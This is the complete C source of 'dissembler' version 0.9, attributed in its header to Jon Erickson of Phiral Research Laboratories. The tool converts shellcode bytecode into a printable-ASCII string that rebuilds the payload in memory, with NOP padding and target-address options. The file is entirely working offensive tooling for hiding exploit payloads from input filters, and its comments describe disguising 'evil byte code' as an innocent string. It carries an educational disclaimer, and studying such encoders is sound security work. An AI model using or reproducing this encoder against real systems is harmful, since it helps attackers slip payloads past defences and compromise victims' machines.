/*********************************************************\
*      dissembler   ver. 0.9    *    File: dissembler.c   *
***********************************************************
*                                                         *
*  Author:        Jon Erickson <matrix@phiral.com>        *
*  Organization:  Phiral Research Laboratories            *
*                                                         *
*  Like a wolf in sheeps clothing, evil byte code that    *
*  has been dissembled looks like an innocent string.     *
*                                                         *
*   dissemble - dis'sem'ble                               *
*    1. To disguise or conceal behind a false appearance  *
*    2. To make a false show of; feign                    *
*                                                         *
\*********************************************************/

         /*   FOR EDUCATIONAL PURPOSES ONLY  */

#include <stdio.h>
#include <sys/stat.h>
#include <ctype.h>
#include <time.h>
#include <stdlib.h>
#include <string.h>

#define VERSION "0.9"
#define CHR "%_01234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ-"
#define MAX_CHR 128

void usage(char *);
void banner();
char *gen(unsigned int, unsigned int, char *);

int main(int argc, char* argv[])
{
	unsigned int targ=0, next=0, last=0xbfffffe0;
	int i, j, k, len, norm, pad, opt;
	int size=0, esc=0, ninja=0, bridge=-1;
	char *head=0, *body, *mem, *code=0;
	struct stat buff;
	FILE *fh;
	extern char *optarg;
	extern int optind;

	banner();
	if(argc < 2) usage(argv[0]);

	srand(time(NULL));
	len = strlen(CHR);
	while((opt = getopt(argc, argv, "Nt:s:b:c:w:e")) != EOF)
	{
		switch(opt)
		{
			case 't':
				targ = strtoul(optarg, NULL, 0);
				fprintf(stderr, "[t] Target address: %p\n", targ);
				break;
			case 'N':
				ninja = 4;
				fprintf(stderr, "[N] Ninja Magic Optimization: ON\n");
				break;
			case 's':
				size = atoi(optarg);
				if(size)
				{
					fprintf(stderr, "[s] Size changes target: ON   ");
					fprintf(stderr, "(adjust size: %d bytes)\n", size);
				}
				break;
			case 'b':
				bridge = atoi(optarg);
				fprintf(stderr, "[b] Bridge size: %d words\n", bridge);
				break;
			case 'c':
				code = optarg;
				len = strlen(optarg);
				fprintf(stderr, "[c] Using charset: %s (%d)\n", code, strlen(code));
				break;
			case 'w':
				head = optarg;
				fprintf(stderr, "[w] Write to Output File: %s \n", head);
				break;
			case 'e':
				esc = 1;
				fprintf(stderr, "[e] Escape the backslash: ON\n");
				break;
		}
	}

	if(size && !ninja)
	{
		fprintf(stderr, "[!] Size adjustment needs ninja magic.. enabling..\n");
		fprintf(stderr, "[N] Ninja Magic Optimization: ON\n");
		ninja = 4;
	}

	if(stat(argv[optind], &buff))
	{
		fprintf(stderr,"\nError: problem with source bytecode file: %s\n", argv[optind]);
		exit(-1);
	}
	norm = buff.st_size;
	pad = (norm%4)+4;
	mem = (char *) malloc(((norm+pad)*7)+len+62)+21;
	if(code) 
		strncpy(mem, code, len);
	else
		strncpy(mem, CHR, len);
	mem[len] = 0;
	code = mem + len + 2;
	memset(code, 0x90, 8);
	fh = fopen(argv[optind], "r");
	fread(code+pad, norm, 1, fh);
	fclose(fh);

	if(head)
	{
		fh = fopen(head, "w");
		if(!fh)
		{
		fprintf(stderr, "\nError: Couldn't open output file: %s\n", head);
		exit(-1);
		}	
	}
	else
		fh = stdout;

	head = code + norm+pad+1;
	body = head + 38;

	if(targ)
	{
		last = targ + 20+ (norm+pad)*5;
		fprintf(stderr,"[+] Ending address: %p\n", last);
		if((bridge<0) && !(ninja)) bridge = norm/4;
	}
	else
		targ = last;

	fprintf(stderr, "[*] Dissembling bytecode from \'%s\'...\n", argv[optind]);
	opt = strlen(mem);
	head[0] = head[5] = head[10] = 37;
	for(i=1; i < 5; i++)
	{
		strfry(mem);
		for(j=0; j < opt; j++)
		{
			for(k=opt-1; k >= 0; k--)
			{
				if(!(mem[j] & mem[k] & 0xff))
				{
					head[i]   = mem[j];
					head[i+5] = mem[k];
					k = -1; j = opt;
					head[10]++;
				}
			}
		}
	}
	if(head[10] != 41)
	{
		fprintf(stderr,"\nError: Cannot dissemble header with current charset.");
		fprintf(stderr,"\ncharset: %s (%d)\n", mem, strlen(mem));
		exit(-1);
	}
	opt = j = 0;

magic:
	strfry(mem);
	sprintf(head+10, "%sP\\", gen(last, next, mem));

	bzero(body, (norm+pad)*5);
	for(k=norm+pad-4; k >=ninja; k=k-4)
	{
		sscanf(code+k,"%4c",&next);
		strfry(mem);
		strcat(body, gen(next, last, mem));
		strcat(body, "P");
		last = next;
	}
	len = opt;	
	opt = strlen(head) + strlen(body);
	if((opt != len) && (j<34) && ninja)
	{
		fprintf(stderr, "[&] Optimizing with ninja magic...\n");
		last = targ + norm + opt;
		if(size)
		{
			last = last+size-opt;	
			fprintf(stderr, "[&] Adjusting target address to %p..\n", targ+size-opt);
		}
		next = 0;
		j++;
		if(j > 12)
		{
			j = 56;
			fprintf(stderr, "[!] Indecision is my enemy : selecting the best...\n");
			if(opt < len) goto freedom;
		}
		goto magic;
	}
freedom:
	if(bridge>0) opt+=bridge;
	fprintf(stderr, "\n[+] dissembled bytecode is %d bytes long.\n--\n", opt);
	if(esc)
		fprintf(fh, "%s\\%s", head, body);
	else
		fprintf(fh, "%s%s", head, body);

	if(!ninja)
	{
		if(bridge<0)
			bridge = norm+pad;
		for(i=0; i < bridge; i++)
			fprintf(fh, "P");
	}
	fprintf(fh,"\n");
	if(fh != stdout) close(fh);
	free(mem-21);
}

void banner()
{
	fprintf(stderr, "dissembler %s - polymorphs bytecode to a printable ASCII string\n", VERSION);
	fprintf(stderr, "  - Jon Erickson <matrix@phiral.com>  Phiral Research Labs -\n");
	fprintf(stderr, "      438C 0255 861A 0D2A 6F6A  14FA 3229 4BD7 5ED9 69D0\n\n");
}

void usage(char *name)
{
	printf("Usage: %s [switches] bytecode\n", name);
	printf("\nOptional dissembler switches:\n");
	printf("   -t <target address>    near where the bytecode is going\n");
	printf("   -N                     optimize with ninja magic\n");
	printf("   -s <original size>     size changes target, adjust with orig size\n");
	printf("   -b <NOP bridge size>   number of words in the NOP bridge\n");
	printf("   -c <charset>           which chars are considered printable\n");
	printf("   -w <output file>       write dissembled code to output file\n");
	printf("   -e                     escape the backlash in output\n");
	printf("\n");
	exit(0);
}

char* gen(unsigned int targ, unsigned int last, char *X)
{
	unsigned int t[4], l[4];
	unsigned int try, single, carry=0;
	int a, i, j, k, m, z, flag=0;
	char p[MAX_CHR],q[MAX_CHR],r[MAX_CHR],s[MAX_CHR], *pr=X-21;
	int len = strlen(X);

	for(a=0; a < len+2; a++)
		p[a] = q[a] = r[a] = s[a] = a+1;
	p[len] = q[len] = r[len] = s[len] = 0;
	strfry(p);
	strfry(q);
	strfry(r);
	strfry(s);

	pr[0] = pr[5] = pr[10] = pr[15] = 45;
	t[3] = (targ & 0xff000000)>>24;
	t[2] = (targ & 0x00ff0000)>>16;
	t[1] = (targ & 0x0000ff00)>>8;
	t[0] = (targ & 0x000000ff);
	l[3] = (last & 0xff000000)>>24;
	l[2] = (last & 0x00ff0000)>>16;
	l[1] = (last & 0x0000ff00)>>8;
	l[0] = (last & 0x000000ff);

	for(a=1; a < 5; a++) {
		carry = flag = 0;
		for(z=0; z < 4; z++) {
			for(i=0; i < len; i++) {
				for(j=0; j < len; j++) {
					for(k=0; k < len; k++) {
						for(m=0; m < len; m++)
						{
							if(a < 2) j = len+1;
							if(a < 3) k = len+1;
							if(a < 4) m = len+1;
							try = t[z] + carry+X[p[i]-1]+X[q[j]-1]+X[r[k]-1]+X[s[m]-1];
							single = (try & 0x000000ff);
							if(single == l[z])
							{
								carry = (try & 0x0000ff00)>>8;
								if(i < len) pr[1+z]  = X[p[i]-1];
								if(j < len) pr[6+z]  = X[q[j]-1];
								if(k < len) pr[11+z] = X[r[k]-1];
								if(m < len) pr[16+z] = X[s[m]-1];
								i = j = k = m = len+2;
								flag++;
							}
						}
					}
				}
			}
		}
		if(flag ==4)
		{
			pr[5*a] = 0;
			a = 6;
		}
	}
	if(flag !=4) 
	{
		fprintf(stderr,"\nError: Cannot dissemble bytecode with current charset.");
		fprintf(stderr,"\ncharset: %s (%d)\n", X, strlen(X));
		exit(-1);
	}
	return pr;
}

